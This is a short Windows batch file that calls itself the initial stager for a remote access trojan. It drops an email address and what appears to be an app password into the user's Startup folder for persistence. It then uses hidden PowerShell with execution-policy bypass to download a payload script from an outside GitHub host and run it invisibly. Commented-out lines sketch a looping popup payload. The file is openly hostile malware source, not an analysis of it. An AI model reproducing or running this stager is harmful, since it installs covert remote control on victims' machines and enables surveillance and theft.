@echo off

@rem initial stager for the rat

set email="defalttests@gmail.com"
set password="nkos qxgo yxvo brmr"
set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%
echo %email%>email.txt
echo %password%>password.txt

@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"

@rem move back to saved directory
cd %InitialPath%

@REM del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

